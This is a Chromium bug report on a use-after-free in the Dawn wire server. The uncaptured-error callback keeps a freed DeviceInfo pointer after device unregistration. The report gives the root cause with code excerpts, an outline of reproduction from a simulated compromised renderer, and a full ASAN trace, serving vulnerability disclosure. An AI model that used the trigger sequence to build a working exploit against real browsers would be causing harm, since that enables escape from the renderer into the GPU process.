# Use-After-Free in Dawn Wire Server Uncaptured-Error Callback via Incomplete Device Unregistration Cleanup

| Field | Value |
|-------|-------|
| **Issue ID** | [491518608](https://issues.chromium.org/issues/491518608) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Dawn>Wire |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | lo...@google.com |
| **Created** | 2026-03-10 |
| **Bounty** | $70,000.00 |

## Description

## Summary

The Dawn wire server's device cleanup function fails to clear the uncaptured-error callback when a device is unregistered, leaving a dangling pointer to a freed DeviceInfo structure as the callback's userdata. A compromised renderer can exploit this by sending an UnregisterObject command for a device followed by a QueueWriteBuffer command with invalid parameters in the same wire command batch. The first command frees the DeviceInfo structure while the native device remains alive due to an extra reference held by Chromium's WebGPUDecoderImpl. The second command triggers a validation error on the still-alive native device, which fires the uncaptured-error callback and dereferences the freed DeviceInfo pointer, producing a use-after-free in the GPU process. ASAN confirms this as NOT PROTECTED by MiraclePtr. The vulnerability affects all platforms that support WebGPU. No special GPU hardware is required.

## Bisect

The vulnerability was introduced when the uncaptured-error callback was migrated from a dynamic `deviceSetUncapturedErrorCallback` call in `Server.cpp` to a descriptor-based setup in `ServerAdapter.cpp`. Before this change, `ClearDeviceCallbacks` cleared both the uncaptured-error and logging callbacks. The commit removed the uncaptured-error cleanup from `ClearDeviceCallbacks` but did not add any replacement, leaving the callback with a dangling `DeviceInfo*` userdata after device unregistration.

Introducing Commit (Dawn): `f2a5e573d7022cdc709824d3cc6a1195ef0ba690`

- Date: Thu Jun 20 21:56:42 2024
- Author: Loko Kung
- Review: <https://dawn-review.googlesource.com/c/dawn/+/192741>

Chromium Roll: `5812b73728a49e078d6e3db94389a25de4fe0dfb`

- Date: Fri Jun 21 19:16:00 2024
- Description: Roll Dawn from b58a264fc729 to 52baba00758d (19 revisions)

## Root Cause

When the Dawn wire server creates a device in response to an AdapterRequestDevice command, it registers an uncaptured-error callback with a raw pointer to a heap-allocated DeviceInfo structure as userdata:

```
// third_party/dawn/src/dawn/wire/server/ServerAdapter.cpp:63-73
desc.uncapturedErrorCallbackInfo = {
    nullptr,
    [](WGPUDevice const*, WGPUErrorType type, WGPUStringView message, void*, void* userdata) {
        DeviceInfo* info = static_cast<DeviceInfo*>(userdata);
        {
            auto serverGuard = info->server->GetGuard();
            info->server->OnUncapturedError(info->self, type, message);
        }
        info->server->Flush();
    },
    nullptr, device->info.get()};

```

The DeviceInfo is owned by `ObjectData<WGPUDevice>` as a `std::unique_ptr<DeviceInfo>`:

```
// third_party/dawn/src/dawn/wire/server/ObjectStorage.h:78-88
struct DeviceInfo {
    raw_ptr<Server> server;
    ObjectHandle self;
};

template <>
struct ObjectData<WGPUDevice> : public ObjectDataBase<WGPUDevice> {
    // Store |info| as a separate allocation so that its address does not move.
    // The pointer to |info| is used as the userdata to device callback.
    std::unique_ptr<DeviceInfo> info = std::make_unique<DeviceInfo>();
};

```

The wire server provides a `ClearDeviceCallbacks` function that is called during device unregistration. This function clears only the logging callback, not the uncaptured-error callback:

```
// third_party/dawn/src/dawn/wire/server/Server.cpp:200-203
void Server::ClearDeviceCallbacks(WGPUDevice device) {
    // Un-set the logging callback since we cannot forward them after the server has been destroyed.
    mProcs->deviceSetLoggingCallback(device, kEmptyLoggingCallbackInfo);
}

```

The device unregistration path in the auto-generated doers calls `Free<WGPUDevice>` to move the ObjectData out of the server's object table, then calls ClearDeviceCallbacks and Release, and finally lets the local ObjectData go out of scope, which destroys the unique\_ptr and frees the DeviceInfo:

```
// out/asan/gen/third_party/dawn/src/dawn/wire/server/ServerDoers_autogen.cpp:1292-1302
case ObjectType::Device: {
    ObjectData<WGPUDevice> data;
    WIRE_TRY(Free<WGPUDevice>(objectId, &data));
    if (data.state == AllocationState::Allocated) {
        DAWN_ASSERT(data.handle != nullptr);
        ClearDeviceCallbacks(data.handle);
        Release(data.handle);
    }
    return WireResult::Success;
} // data destructor frees data.info (unique_ptr<DeviceInfo>)

```

The `Release(data.handle)` call decrements the native device's external reference count. Under normal circumstances this would trigger `WillDropLastExternalRef`, which resets the uncaptured-error callback at the native level. However, Chromium's `WebGPUDecoderImpl` holds an additional reference to every created device in its `known_device_metadata_` map:

```
// gpu/command_buffer/service/webgpu_decoder_impl.cc:1619-1634
wgpu::Device device_copy = device;
// ...
if (device_copy) {
    known_device_metadata_.emplace(
        std::move(device_copy),
        DeviceMetadata{info.adapterType, info.backendType});
}

```

This extra reference prevents the external reference count from reaching zero after the wire server's Release call. The native device remains alive with `mState == State::Alive`, and its `mUncapturedErrorCallbackInfo` still holds the raw pointer to the now-freed DeviceInfo structure.

The `known_device_metadata_` entries are cleaned up asynchronously in `PerformPollingWork`, which checks `wire_server_->IsDeviceKnown(device.Get())` and erases entries for devices no longer known to the wire server. This cleanup does not run during `HandleCommands`, so a command batch that unregisters a device and then triggers a validation error on the same device will reliably produce the use-after-free.

The native device's `HandleError` method invokes the uncaptured-error callback synchronously when the device is in the Alive state and no error scope captures the error:

```
// third_party/dawn/src/dawn/native/Device.cpp:827-834
if (!captured && mUncapturedErrorCallbackInfo.callback != nullptr && mState == State::Alive) {
    auto device = ToAPI(this);
    mUncapturedErrorCallbackInfo.callback(
        &device, ToAPI(ToWGPUErrorType(type)), ToOutputStringView(messageStr),
        mUncapturedErrorCallbackInfo.userdata1, mUncapturedErrorCallbackInfo.userdata2);
}

```

The callback lambda in ServerAdapter.cpp then dereferences the freed DeviceInfo pointer via `info->server->GetGuard()` and `info->server->OnUncapturedError(...)`, producing the use-after-free.

## Reproduce

Tested on Chromium commit `1cf03136f094a16c5d029554426290ad46e58374` on macOS. The ASAN build directory should be configured with the following args.gn:

```
is_asan = true
is_debug = false
dcheck_always_on = false

```

**This vulnerability is not suitable for a MojoJS-based PoC because the exploit operates through the Dawn wire protocol embedded inside the GPU command buffer's shared memory ring, not through direct Mojo IPC messages. The patch modifies two renderer-side files to simulate a compromised renderer. Both modification sites include a `cmdline->HasSwitch("type") && cmdline->GetSwitchValueASCII("type") == "renderer"` process guard to ensure all changes execute exclusively in the renderer process. The ASAN crash is captured in the GPU process.**

```
git apply patch.diff
autoninja -C out/asan chrome

```

Launch Chrome:

```
./out/asan/Chromium.app/Contents/MacOS/Chromium --user-data-dir=./userdata poc.html

```

The PoC page creates a WebGPU device, obtains its queue, and creates a small buffer with COPY\_DST usage. It then calls device.destroy(), which the patch redirects to send an UnregisterObject command for the device. Immediately afterwards, it calls queue.writeBuffer with a buffer offset far exceeding the buffer's size. Both commands are flushed together. The GPU process wire server processes the UnregisterObject first, freeing the DeviceInfo structure, then processes the QueueWriteBuffer, which triggers a validation error on the native device. The uncaptured-error callback fires with the freed DeviceInfo pointer as userdata, and ASAN reports a heap-use-after-free when the callback dereferences it.

ASAN output:

```
=================================================================
==44414==ERROR: AddressSanitizer: heap-use-after-free on address 0x60200007df70 at pc 0x0003621ac1d0 bp 0x00016af743b0 sp 0x00016af743a8
READ of size 8 at 0x60200007df70 thread T0
==44414==WARNING: invalid path to external symbolizer!
==44414==WARNING: Failed to use and restart external symbolizer!
    #0 0x0003621ac1cc in dawn::wire::server::Server::DoAdapterRequestDevice(dawn::wire::server::Known<WGPUAdapterImpl*>, dawn::wire::ObjectHandle, WGPUFuture, dawn::wire::ObjectHandle, WGPUFuture, WGPUDeviceDescriptor const*)::$_0::__invoke(WGPUDeviceImpl* const*, WGPUErrorType, WGPUStringView, void*, void*)+0x278 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186e01cc)
    #1 0x00034adbb080 in dawn::native::DeviceBase::HandleError(std::__Cr::unique_ptr<dawn::native::ErrorData, std::__Cr::default_delete<dawn::native::ErrorData>>, dawn::native::InternalErrorType, wgpu::DeviceLostReason, dawn::native::DeviceBase::ForwardToErrorScope)+0x560 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x12ef080)
    #2 0x00034aea2158 in dawn::native::QueueBase::APIWriteBuffer(dawn::native::BufferBase*, unsigned long long, void const*, unsigned long)+0x220 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x13d6158)
    #3 0x00034ac92f38 in dawn::native::NativeQueueWriteBuffer(WGPUQueueImpl*, WGPUBufferImpl*, unsigned long long, void const*, unsigned long)+0xf4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x11c6f38)
    #4 0x0003621a64f4 in dawn::wire::server::Server::DoQueueWriteBuffer(dawn::wire::server::Known<WGPUQueueImpl*>, dawn::wire::server::Known<WGPUBufferImpl*>, unsigned long long, unsigned char const*, unsigned long long)+0xd0 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186da4f4)
    #5 0x0003621b74b8 in dawn::wire::server::Server::HandleQueueWriteBuffer(dawn::wire::DeserializeBuffer*)+0x2c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186eb4b8)
    #6 0x0003621ba660 in dawn::wire::server::Server::HandleCommands(char const volatile*, unsigned long)+0xe00 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186ee660)
    #7 0x0003621ef38c in gpu::webgpu::(anonymous namespace)::DawnWireServer::HandleCommands(char const volatile*, unsigned long)+0x154 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1872338c)
    #8 0x0003621ef790 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::HandleDawnCommands(unsigned int, void const volatile*)+0x2e8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18723790)
    #9 0x0003621e5714 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::DoCommands(unsigned int, void const volatile*, int, int*)+0x200 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18719714)
    #10 0x00035189af08 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)+0x4bc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7dcef08)
    #11 0x0003620fb380 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)+0x450 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1862f380)
    #12 0x0003620fa4e8 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)+0x468 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1862e4e8)
    #13 0x000362118dcc in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1864cdcc)
    #14 0x000362124a84 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)+0x144 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18658a84)
    #15 0x00036212489c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)+0x118 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1865889c)
    #16 0x0003518d3d58 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7e07d58)
    #17 0x0003518ae838 in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x634 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de2838)
    #18 0x0003518aced0 in gpu::Scheduler::RunNextTask()+0x27c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de0ed0)
    #19 0x0003518b026c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x184 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de426c)
    #20 0x00035beea8a4 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1241e8a4)
    #21 0x00035bf5290c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1248690c)
    #22 0x00035bf51cc4 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x12485cc4)
    #23 0x00035c073330 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a7330)
    #24 0x00035c0649e0 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125989e0)
    #25 0x00035c071798 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xe4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a5798)
    #26 0x00019b3549f4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f9f4)
    #27 0x00019b354988 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f988)
    #28 0x00019b3546f4 in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f6f4)
    #29 0x00019b353384 in __CFRunLoopRun+0x330 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5e384)
    #30 0x00019b40de30 in _CFRunLoopRunSpecificWithOptions+0x210 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x118e30)
    #31 0x00019d5a2960 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:]+0xd0 (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:arm64e+0xa5b960)
    #32 0x00035c07448c in base::MessagePumpNSRunLoop::DoRun(base::MessagePump::Delegate*)+0xc8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a848c)
    #33 0x00035c070500 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a4500)
    #34 0x00035bf53c6c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x32c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x12487c6c)
    #35 0x00035be7885c in base::RunLoop::Run(base::Location const&)+0x430 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x123ac85c)
    #36 0x00036523bea8 in content::GpuMain(content::MainFunctionParams)+0x8b4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1b76fea8)
    #37 0x0003585cbdd0 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)+0x420 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0xeaffdd0)
    #38 0x0003585cdf50 in content::ContentMainRunnerImpl::Run()+0x53c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0xeb01f50)
    #39 0x0003585c9ac0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x858 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0xeafdac0)
    #40 0x0003585c9fb0 in content::ContentMain(content::ContentMainParams)+0x190 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0xeafdfb0)
    #41 0x000349ad1cb4 in ChromeMain+0x490 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x5cb4)
    #42 0x000104e88c94 in main+0x254 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Helpers/Chromium Helper.app/Contents/MacOS/Chromium Helper:arm64+0x100000c94)
    #43 0x00019aeedd50 in start+0x1c0c (/usr/lib/dyld:arm64e+0x8d50)

0x60200007df70 is located 0 bytes inside of 16-byte region [0x60200007df70,0x60200007df80)
freed by thread T0 here:
    #0 0x00010542d074 in __asan_memmove+0x308c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Helpers/Chromium Helper.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x55074)
    #1 0x00036219e574 in dawn::wire::server::Server::DoUnregisterObject(dawn::wire::ObjectType, unsigned int)+0x578 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186d2574)
    #2 0x0003621bac44 in dawn::wire::server::Server::HandleCommands(char const volatile*, unsigned long)+0x13e4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186eec44)
    #3 0x0003621ef38c in gpu::webgpu::(anonymous namespace)::DawnWireServer::HandleCommands(char const volatile*, unsigned long)+0x154 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1872338c)
    #4 0x0003621ef790 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::HandleDawnCommands(unsigned int, void const volatile*)+0x2e8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18723790)
    #5 0x0003621e5714 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::DoCommands(unsigned int, void const volatile*, int, int*)+0x200 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18719714)
    #6 0x00035189af08 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)+0x4bc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7dcef08)
    #7 0x0003620fb380 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)+0x450 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1862f380)
    #8 0x0003620fa4e8 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)+0x468 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1862e4e8)
    #9 0x000362118dcc in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1864cdcc)
    #10 0x000362124a84 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)+0x144 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18658a84)
    #11 0x00036212489c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)+0x118 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1865889c)
    #12 0x0003518d3d58 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7e07d58)
    #13 0x0003518ae838 in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x634 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de2838)
    #14 0x0003518aced0 in gpu::Scheduler::RunNextTask()+0x27c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de0ed0)
    #15 0x0003518b026c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x184 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de426c)
